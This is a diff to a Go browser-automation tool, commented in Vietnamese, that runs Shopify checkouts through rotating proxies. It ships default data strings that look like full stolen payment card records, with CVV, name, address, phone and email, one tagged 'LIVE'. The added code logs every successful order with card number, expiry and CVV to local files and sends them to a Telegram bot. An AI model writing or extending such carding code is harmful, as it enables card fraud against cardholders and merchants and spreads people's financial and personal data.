@@ -24,7 +24,7 @@ import (
 )
 
 // DefaultProxy do người dùng cung cấp
-const DefaultProxy = "global.rotip.trustsource.live:20000:USER501664-zone-custom-region-US-session-38844788:41b761"
+const DefaultProxy = "global.rotip.trustsource.live:20000:USER501664-zone-custom-region-US-session-53013234:41b761"
 
 // UserProfile lưu thông tin người dùng được trích xuất từ chuỗi mẫu
 type UserProfile struct {
@@ -43,6 +43,7 @@ type UserProfile struct {
 	Country    string
 	Phone      string
 	RawAddress string
+	RawData    string
 }
 
 // CheckoutTask chứa thông tin của tác vụ mua hàng
@@ -54,6 +55,274 @@ type CheckoutTask struct {
 	DiscountCode string
 	Headless     bool
 	UserAgent    string
+	TeleCfg      TelegramConfig
+}
+
+// ThankYouDetails trích xuất từ màn hình xác nhận mua hàng thành công
+type ThankYouDetails struct {
+	ConfirmationNumber string
+	Greeting           string
+	TotalAmount        string
+	ProductName        string
+	FinalURL           string
+}
+
+var successFileMutex sync.Mutex
+
+// extractThankYouPageDetails trích xuất chi tiết đơn hàng từ màn hình Thank You / Confirmation
+func extractThankYouPageDetails(page *rod.Page) ThankYouDetails {
+	details := ThankYouDetails{}
+
+	info, err := page.Info()
+	if err == nil && info != nil {
+		details.FinalURL = info.URL
+	}
+
+	for retry := 0; retry < 4; retry++ {
+		evalRes, err := page.Eval(`() => {
+			let confirmNum = '';
+			let greeting = '';
+			let total = '';
+			let product = '';
+
+			const bodyText = (document.body ? document.body.innerText : '');
+
+			// 1. Tìm Confirmation Number (Ví dụ: Confirmation #XUEHATTZ5 hoặc #XUEHATTZ5)
+			const confirmMatch = bodyText.match(/Confirmation\s*(#[A-Z0-9]+)/i) ||
+			                     bodyText.match(/Order\s*number\s*(#[A-Z0-9]+)/i) ||
+			                     bodyText.match(/Confirmation\s+code\s*[:#]?\s*([A-Z0-9]+)/i) ||
+			                     bodyText.match(/Order\s*(#[A-Z0-9]+)/i) ||
+			                     bodyText.match(/(#[A-Z0-9]{6,})/);
+			if (confirmMatch) {
+				confirmNum = confirmMatch[1] || confirmMatch[0];
+			} else {
+				const el = document.querySelector('.os-order-number, [data-order-number], [class*="order-number"], [class*="confirmation-number"]');
+				if (el) confirmNum = (el.innerText || el.textContent || '').trim();
+			}
+
+			// 2. Tìm Greeting (Ví dụ: "Thank you, Dolgov!")
+			const greetMatch = bodyText.match(/Thank\s+you[,\s]+([^\n!.]+)[!.]?/i);
+			if (greetMatch) {
+				greeting = greetMatch[0].trim();
+			}
+
+			// 3. Tìm Total Amount (Ví dụ: USD $114.48 hoặc $114.48)
+			const totalMatch = bodyText.match(/Total[\s\S]*?(USD\s*\$[\d.,]+|\$[\d.,]+)/i) ||
+			                   bodyText.match(/(USD\s*\$[\d.,]+)/i);
+			if (totalMatch) {
+				total = totalMatch[1].trim();
+			} else {
+				const totalEl = document.querySelector('[data-checkout-payment-due-target], .total-line__price, [class*="payment-due-price"], [class*="total-price"]');
+				if (totalEl) total = (totalEl.innerText || totalEl.textContent || '').trim();
+			}
+
+			// 4. Tìm Tên sản phẩm
+			const prodEl = document.querySelector('.product__description__name, [class*="product-name"], [class*="line-item"] h3');
+			if (prodEl) {
+				product = (prodEl.innerText || prodEl.textContent || '').trim();
+			}
+
+			return {
+				confirmNum: confirmNum,
+				greeting: greeting,
+				total: total,
+				product: product
+			};
+		}`)
+
+		if err == nil && evalRes != nil {
+			cNum := evalRes.Value.Get("confirmNum").String()
+			greet := evalRes.Value.Get("greeting").String()
+			tot := evalRes.Value.Get("total").String()
+			prod := evalRes.Value.Get("product").String()
+
+			if cNum != "" {
+				details.ConfirmationNumber = cNum
+			}
+			if greet != "" {
+				details.Greeting = greet
+			}
+			if tot != "" {
+				details.TotalAmount = tot
+			}
+			if prod != "" {
+				details.ProductName = prod
+			}
+
+			if details.ConfirmationNumber != "" && details.TotalAmount != "" {
+				break
+			}
+		}
+		time.Sleep(1 * time.Second)
+	}
+
+	return details
+}
+
+// saveSuccessOrderToFile lưu toàn bộ thông tin vừa nhập và thông tin đơn hàng ra file
+func saveSuccessOrderToFile(task CheckoutTask, tyDetails ThankYouDetails, filePath string) error {
+	successFileMutex.Lock()
+	defer successFileMutex.Unlock()
+
+	timestamp := time.Now().Format("2006-01-02 15:04:05")
+	p := task.Profile
+	if p == nil {
+		p = &UserProfile{}
+	}
+
+	orderCode := tyDetails.ConfirmationNumber
+	if orderCode == "" {
+		orderCode = "Confirmation (Đã ghi nhận trên màn hình)"
+	}
+	totalMoney := tyDetails.TotalAmount
+	if totalMoney == "" {
+		totalMoney = "N/A"
+	}
+	greeting := tyDetails.Greeting
+	if greeting == "" {
+		greeting = fmt.Sprintf("Thank you, %s!", strings.TrimSpace(p.FirstName+" "+p.LastName))
+	}
+
+	// 1. Ghi đầy đủ thông tin chi tiết dạng khối vào success_orders.txt
+	contentBlock := fmt.Sprintf(`================================================================================
+🎉 ĐƠN HÀNG THANH TOÁN THÀNH CÔNG (THANK YOU) - %s
+================================================================================
+[THÔNG TIN ĐƠN HÀNG TRÊN MÀN HÌNH THANK YOU]
+- Thời gian        : %s
+- Mã xác nhận      : %s
+- Lời cảm ơn       : %s
+- Tổng thanh toán  : %s
+- Sản phẩm xác nhận: %s (Size: %s)
+- URL xác nhận     : %s
+
+[TẤT CẢ THÔNG TIN KHÁCH HÀNG ĐÃ NHẬP]
+- Họ và Tên        : %s %s (Full: %s)
+- Email            : %s
+- Số điện thoại    : %s
+- Địa chỉ đã gõ    : %s
+- Địa chỉ chi tiết : %s, %s, %s %s, %s
+
+[TẤT CẢ THÔNG TIN THẺ THANH TOÁN ĐÃ NHẬP]
+- Số thẻ           : %s
+- Hạn dùng (MM/YY) : %s/%s
+- CVV              : %s
+
+[MÃ GIẢM GIÁ & HỆ THỐNG]
+- Mã giảm giá      : %s
+- URL gốc sản phẩm : %s
+- Size đã chọn     : %s
+- Proxy đã dùng    : %s
+- User-Agent       : %s
+- Dữ liệu thô gốc  : %s
+
+[DÒNG TỔNG HỢP (PIPE FORMAT DỄ IMPORT)]
+%s|%s|%s|%s|%s %s|%s|%s|%s|%s|%s|%s|%s
+================================================================================
+
+`,
+		timestamp,
+		timestamp,
+		orderCode,
+		greeting,
+		totalMoney,
+		task.URL,
+		task.Size,
+		tyDetails.FinalURL,
+		p.FirstName, p.LastName, p.FullName,
+		p.Email,
+		p.Phone,
+		p.RawAddress,
+		p.Address, p.City, p.State, p.ZipCode, p.Country,
+		p.CardNumber,
+		p.ExpMonth, p.ExpYear,
+		p.CVV,
+		task.DiscountCode,
+		task.URL,
+		task.Size,
+		task.Proxy,
+		task.UserAgent,
+		p.RawData,
+		p.CardNumber, p.ExpMonth, p.ExpYear, p.CVV, p.FirstName, p.LastName, p.Email, p.Phone, p.RawAddress, task.DiscountCode, orderCode, totalMoney, timestamp,
+	)
+
+	f, err := os.OpenFile(filePath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+	if err == nil {
+		_, _ = f.WriteString(contentBlock)
+		_ = f.Close()
+	}
+
+	// 2. Ghi thêm vào file bảng tính success_orders.csv
+	csvPath := "success_orders.csv"
+	isNewCSV := false
+	if _, statErr := os.Stat(csvPath); os.IsNotExist(statErr) {
+		isNewCSV = true
+	}
+	csvFile, err := os.OpenFile(csvPath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+	if err == nil {
+		if isNewCSV {
+			_, _ = csvFile.WriteString("Timestamp,ConfirmationCode,Total,FullName,FirstName,LastName,Email,Phone,Address,CardNumber,ExpMonth,ExpYear,CVV,DiscountCode,Size,Proxy,OrderURL\n")
+		}
+		cleanAddr := strings.ReplaceAll(p.RawAddress, ",", " ")
+		cleanProxy := strings.ReplaceAll(task.Proxy, ",", ";")
+		csvLine := fmt.Sprintf("\"%s\",\"%s\",\"%s\",\"%s %s\",\"%s\",\"%s\",\"%s\",\"%s\",\"%s\",\"%s\",\"%s\",\"%s\",\"%s\",\"%s\",\"%s\",\"%s\",\"%s\"\n",
+			timestamp, orderCode, totalMoney, p.FirstName, p.LastName, p.FirstName, p.LastName, p.Email, p.Phone, cleanAddr,
+			p.CardNumber, p.ExpMonth, p.ExpYear, p.CVV, task.DiscountCode, task.Size, cleanProxy, tyDetails.FinalURL,
+		)
+		_, _ = csvFile.WriteString(csvLine)
+		_ = csvFile.Close()
+	}
+
+	// 3. Ghi vào results_success.txt dạng đầy đủ thông tin
+	resultsFile, err := os.OpenFile("results_success.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+	if err == nil {
+		_, _ = resultsFile.WriteString(fmt.Sprintf("[%s] Thành công: %s | Thẻ %s | %s/%s | CVV %s | %s %s | %s | %s | %s | Proxy: %s | Mã: %s\n",
+			timestamp, orderCode, p.CardNumber, p.ExpMonth, p.ExpYear, p.CVV, p.FirstName, p.LastName, p.Email, p.Phone, p.RawAddress, task.Proxy, task.DiscountCode))
+		_ = resultsFile.Close()
+	}
+
+	log.Println("================================================================================")
+	log.Printf("🎉 ĐÃ XUẤT HIỆN MÀN HÌNH THANK YOU & LƯU TẤT CẢ THÔNG TIN VÀO FILE: %s\n", filePath)
+	log.Printf("-> File chi tiết : %s\n", filePath)
+	log.Printf("-> File bảng tính: %s\n", csvPath)
+	log.Printf("-> Mã đơn hàng   : %s | Tổng tiền: %s\n", orderCode, totalMoney)
+	log.Println("================================================================================")
+
+	// 4. Gửi Telegram nếu có cấu hình
+	if task.TeleCfg.BotToken != "" && task.TeleCfg.ChatID != "" {
+		teleMsg := fmt.Sprintf(`🎉 <b>[CHECKOUT THÀNH CÔNG - THANK YOU]</b>
+
+📦 <b>Mã đơn:</b> <code>%s</code>
+💵 <b>Tổng thanh toán:</b> <b>%s</b>
+🏷️ <b>Mã giảm giá:</b> <code>%s</code>
+👟 <b>Size:</b> %s
+
+👤 <b>Khách hàng:</b> %s %s
+📧 <b>Email:</b> %s
+📱 <b>Số điện thoại:</b> %s
+🏠 <b>Địa chỉ:</b> %s
+
+💳 <b>Thẻ tín dụng:</b> <code>%s</code>
+📅 <b>Hạn dùng:</b> %s/%s | <b>CVV:</b> <code>%s</code>
+
+🌐 <b>Proxy:</b> <code>%s</code>
+🕒 <b>Thời gian:</b> %s`,
+			orderCode,
+			totalMoney,
+			task.DiscountCode,
+			task.Size,
+			p.FirstName, p.LastName,
+			p.Email,
+			p.Phone,
+			p.RawAddress,
+			p.CardNumber,
+			p.ExpMonth, p.ExpYear, p.CVV,
+			task.Proxy,
+			timestamp,
+		)
+		sendTelegramAlert(task.TeleCfg, teleMsg)
+	}
+
+	return nil
 }
 
 // TelegramConfig cấu hình Telegram Bot
@@ -438,7 +707,9 @@ func parseDataString(raw string) *UserProfile {
 		parts[i] = strings.TrimSpace(parts[i])
 	}
 
-	profile := &UserProfile{}
+	profile := &UserProfile{
+		RawData: raw,
+	}
 	if len(parts) > 0 {
 		profile.CardNumber = parts[0]
 	}
@@ -625,7 +896,7 @@ func executeSingleCheckout(task CheckoutTask) error {
 	}
 
 	// 8. Chờ kiểm tra giá sau khi áp mã giảm giá và bấm "Pay now"
-	err = extractOrderSummaryAndPayNow(page, profile)
+	err = extractOrderSummaryAndPayNow(page, task)
 	if err != nil {
 		return err
 	}
@@ -643,7 +914,7 @@ func main() {
 	teleChatIDFlag := flag.String("tele-chatid", "", "Telegram Chat ID")
 	headless := flag.Bool("headless", false, "Chạy ẩn trình duyệt (true/false)")
 
-	dataRaw := flag.String("data", "4127770012595490|11|30|043|Clay Shanler|147line street|Feedinghills|MA|01030|US|8602022347|Clayshanler@att.net|73.218.23.95", "Chuỗi dữ liệu tổng hợp")
+	dataRaw := flag.String("data", "5261020013630117|06|28|893|Caitlin Shepherd|46677 Nelson Pines|Hamptonton|Illinois|62295|US|468-368-6344|andersonemily@icloud.com|||||||||||||||||||||||||||||||||||LIVE|85 No reason to decline|T0CHECK.CO", "Chuỗi dữ liệu tổng hợp")
 	emailFlag := flag.String("email", "", "Email thanh toán (để trống sẽ tự lấy từ -data)")
 	firstNameFlag := flag.String("firstname", "", "Tên (First Name)")
 	lastNameFlag := flag.String("lastname", "", "Họ (Last Name)")
@@ -758,6 +1029,7 @@ func main() {
 			DiscountCode: *discountFlag,
 			Headless:     *headless,
 			UserAgent:    currentUA,
+			TeleCfg:      teleCfg,
 		}
 
 		log.Println("==================================================")
@@ -944,18 +1216,25 @@ func fillCheckoutForm(page *rod.Page, profile *UserProfile) error {
 				log.Printf("[!] Cảnh báo chọn suggestion: %v\n", err)
 			}
 
-			// Theo yêu cầu: Sau khi click gợi ý địa chỉ, cập nhật lại ô địa chỉ thành firstname + ". " + address (không click suggestion nữa)
-			addrBase := profile.Address
-			if addrBase == "" {
-				addrBase = addressToType
+			log.Println("-> Đang đợi Shopify điền xong City/State/Zip và chuẩn hoá địa chỉ từ suggestion...")
+			time.Sleep(1500 * time.Millisecond)
+
+			// Lấy giá trị địa chỉ thực tế vừa được suggestion điền vào ô input
+			currentAddrVal := getAddressFieldValue(page)
+			addrBase := currentAddrVal
+			if addrBase != "" {
+				log.Printf("-> Đã lấy được giá trị địa chỉ trong ô input sau khi chọn gợi ý: '%s'\n", addrBase)
+			} else {
+				addrBase = profile.Address
+				if addrBase == "" {
+					addrBase = addressToType
+				}
 			}
+
 			customAddr := addrBase
 			if profile.FirstName != "" && !strings.HasPrefix(addrBase, profile.FirstName+". ") {
 				customAddr = fmt.Sprintf("%s. %s", profile.FirstName, addrBase)
 			}
-
-			log.Println("-> Đang đợi Shopify điền xong City/State/Zip từ suggestion trước khi cập nhật lại địa chỉ...")
-			time.Sleep(1500 * time.Millisecond)
 
 			log.Printf("-> Đang cập nhật lại ô Address thành: '%s' (firstname. address)...\n", customAddr)
 			updateAddressField(page, customAddr)
@@ -1203,6 +1482,34 @@ func selectFirstAddressSuggestion(page *rod.Page, addressEl *rod.Element, addres
 	}
 
 	return fmt.Errorf("không tìm thấy dòng gợi ý địa chỉ")
+}
+
+// getAddressFieldValue lấy giá trị text hiện tại đang có trong ô địa chỉ (sau khi chọn gợi ý)
+func getAddressFieldValue(page *rod.Page) string {
+	res, err := page.Eval(`() => {
+		const selectors = [
+			'input[name="address1"]',
+			'input[name="address"]',
+			'input[name="streetAddress"]',
+			'input[name="shippingAddress.address1"]',
+			'input#address1',
+			'input#shipping-address1',
+			'input[placeholder*="enter an address" i]',
+			'input[placeholder*="Address" i]'
+		];
+		for (const sel of selectors) {
+			const el = document.querySelector(sel);
+			if (el && el.value) {
+				const v = el.value.trim();
+				if (v.length > 0) return v;
+			}
+		}
+		return '';
+	}`)
+	if err == nil && res != nil {
+		return res.Value.String()
+	}
+	return ""
 }
 
 // updateAddressField cập nhật lại giá trị ô địa chỉ thành firstname.address và đóng gợi ý
@@ -2323,7 +2630,12 @@ func clickPayNowButton(page *rod.Page) (bool, string) {
 }
 
 // extractOrderSummaryAndPayNow kiểm tra giá tiền đã giảm và bấm Pay now (chờ API xử lý xong 100% trước khi bước tiếp theo)
-func extractOrderSummaryAndPayNow(page *rod.Page, profile *UserProfile) error {
+func extractOrderSummaryAndPayNow(page *rod.Page, task CheckoutTask) error {
+	profile := task.Profile
+	if profile == nil {
+		profile = &UserProfile{}
+	}
+
 	log.Println("==================================================")
 	log.Println("-> [BƯỚC 8] ĐANG ĐỢI CẬP NHẬT GIÁ VÀ BẤM 'PAY NOW'...")
 	log.Println("==================================================")
@@ -2413,7 +2725,25 @@ func extractOrderSummaryAndPayNow(page *rod.Page, profile *UserProfile) error {
 		if clicked {
 			log.Printf("-> ĐÃ BẤM THÀNH CÔNG NÚT '%s' (Lần %d)!\n", btnName, attempt)
 		} else {
-			log.Println("-> Nút thanh toán không còn hiển thị (đơn hàng đang được xử lý hoặc đã chuyển trang thành công).")
+			log.Println("-> Nút thanh toán không còn hiển thị. Đang kiểm tra xem đơn hàng đã chuyển trang Thank You thành công hay chưa...")
+			time.Sleep(2 * time.Second)
+			_, isAlreadySuccess, _ := waitForPaymentProcessing(page, 10*time.Second)
+			if isAlreadySuccess {
+				info, _ := page.Info()
+				finalURL := ""
+				if info != nil {
+					finalURL = info.URL
+				}
+				log.Printf("-> XÁC NHẬN ĐƠN HÀNG THÀNH CÔNG TẠI URL: %s\n", finalURL)
+				log.Println("-> Đang trích xuất thông tin trên màn hình Thank You và lưu ra file...")
+				time.Sleep(2500 * time.Millisecond)
+				tyDetails := extractThankYouPageDetails(page)
+				if tyDetails.FinalURL == "" {
+					tyDetails.FinalURL = finalURL
+				}
+				_ = saveSuccessOrderToFile(task, tyDetails, "success_orders.txt")
+				return nil
+			}
 			break
 		}
 
@@ -2429,6 +2759,14 @@ func extractOrderSummaryAndPayNow(page *rod.Page, profile *UserProfile) error {
 				finalURL = info.URL
 			}
 			log.Printf("-> API THANH TOÁN ĐÃ GỌI XONG VÀ THÀNH CÔNG!\n-> URL: %s\n", finalURL)
+			log.Println("-> [MÀN HÌNH THANK YOU] Đang trích xuất thông tin đơn hàng và lưu tất cả thông tin vừa nhập ra file...")
+			time.Sleep(2500 * time.Millisecond)
+
+			tyDetails := extractThankYouPageDetails(page)
+			if tyDetails.FinalURL == "" {
+				tyDetails.FinalURL = finalURL
+			}
+			_ = saveSuccessOrderToFile(task, tyDetails, "success_orders.txt")
 			return nil
 		}
 
@@ -2473,10 +2811,17 @@ func waitForPaymentProcessing(page *rod.Page, timeout time.Duration) (finished b
 
 		// 2. Đánh giá trạng thái DOM
 		evalRes, err := page.Eval(`() => {
-			// A. Kiểm tra trang có thông báo xác nhận thành công không
+			// A. Kiểm tra trang có thông báo xác nhận thành công không (màn Thank You / Confirmation)
 			const bodyText = (document.body ? document.body.innerText : '');
 			const bodyTextLower = bodyText.toLowerCase();
-			if (bodyTextLower.includes('thank you for your purchase') || bodyTextLower.includes('your order is confirmed') || bodyTextLower.includes('order confirmed')) {
+			if (bodyTextLower.includes('thank you for your purchase') || 
+			    bodyTextLower.includes('your order is confirmed') || 
+			    bodyTextLower.includes('order confirmed') || 
+			    bodyTextLower.includes('thank you,') || 
+			    bodyTextLower.includes('confirmation #') || 
+			    bodyTextLower.includes('confirmation code') || 
+			    bodyTextLower.includes("you'll receive a confirmation email") || 
+			    bodyTextLower.includes('you receive a confirmation email')) {
 				return { isSuccessText: true, isProcessing: false, btnText: '', hasError: false, errorMsg: '' };
 			}
 
